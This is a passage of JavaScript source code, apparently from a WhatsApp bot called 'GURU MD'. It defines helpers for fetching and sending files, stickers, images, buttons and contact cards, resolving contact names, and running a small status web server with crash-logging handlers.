        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
        if (data && save) fs.promises.writeFile(filename, data)
        return {
            res,
            filename,
            size: await getSizeMedia(data),
            ...type,
            data
        }
    }

    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    /**
    *
    * @param {*} message
    * @param {*} filename
    * @param {*} attachExtension
    * @returns
    */
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    /**
     *
     * @param {*} jid
     * @param {*} buttons
     * @param {*} caption
     * @param {*} footer
     * @param {*} quoted
     * @param {*} options
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:GURU MD\nitem1.TEL;waid=${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:gurutech@example.com\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/itsguruu/GURU\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;Nairobi;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
  
  app.get("/", (req, res) => {
  res.send(" 𝑮𝑼𝑹𝑼 𝑴𝑫 𝑰𝑺 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ✅");
  });
  app.listen(port, () => {
    console.log(chalk.blue.bold('WEB SERVER'));
    console.log(chalk.blue('Status: Running'));
    console.log(chalk.blue('Port: ' + port));
    console.log(chalk.blue('URL: http://localhost:' + port));
  });

  setTimeout(() => {
    connectToWA()
  }, 4000);

// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.log(chalk.red.bold('UNCAUGHT EXCEPTION'));
  console.log(chalk.red('Error: ' + (err.stack || err.message || err)));
});

process.on("unhandledRejection", (reason, p) => {
  console.log(chalk.red.bold('UNHANDLED PROMISE REJECTION'));
  console.log(chalk.red('Reason: ' + reason));
  console.log(chalk.red('Promise: ' + p));
});
